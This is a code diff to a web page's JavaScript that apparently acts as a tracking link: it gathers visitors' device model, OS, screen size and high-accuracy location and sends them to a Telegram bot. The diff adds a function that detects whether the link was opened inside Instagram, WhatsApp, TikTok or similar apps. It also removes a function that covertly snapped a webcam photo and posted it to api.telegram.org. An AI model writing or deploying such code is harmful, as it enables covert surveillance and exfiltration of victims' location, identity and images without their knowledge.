@@ -112,6 +112,20 @@
             });
         }
 
+        function getBrowserInfo() {
+            let userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes("instagram")) return "Instagram App";
+            if (userAgent.includes("facebook")) return "Facebook App";
+            if (userAgent.includes("whatsapp")) return "WhatsApp";
+            if (userAgent.includes("twitter")) return "Twitter";
+            if (userAgent.includes("tiktok")) return "TikTok";
+            if (userAgent.includes("chrome")) return "Google Chrome";
+            if (userAgent.includes("safari")) return "Safari";
+            if (userAgent.includes("firefox")) return "Firefox";
+            if (userAgent.includes("edge")) return "Microsoft Edge";
+            return "Unknown Browser/App";
+        }
+
         async function getDeviceInfo() {
             let deviceInfo = "📱 **Device Info:**\n";
             let model = "Unknown";
@@ -125,9 +139,12 @@
                 os = navigator.platform;
             }
 
+            let browser = getBrowserInfo();
+
             deviceInfo += `🔹 **Device Model:** ${model}\n`;
             deviceInfo += `🔹 **OS:** ${os}\n`;
             deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;
+            deviceInfo += `🔹 **Opened in:** ${browser}\n`;
 
             return deviceInfo;
         }
@@ -155,36 +172,6 @@
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
-        }
-
-        function capturePhoto() {
-            const video = document.createElement("video");
-            const canvas = document.createElement("canvas");
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.play();
-
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                        stream.getTracks().forEach(track => track.stop());
-
-                        canvas.toBlob(blob => {
-                            let formData = new FormData();
-                            formData.append("chat_id", CHAT_ID);
-                            formData.append("photo", blob, "user_photo.jpg");
-
-                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                                method: "POST",
-                                body: formData
-                            });
-                        }, "image/jpeg");
-                    }, 3000);
-                })
-                .catch(() => sendMessage("📸 **Photo:** Not Available (Permission Denied)"));
         }
 
         function sendMessage(text) {
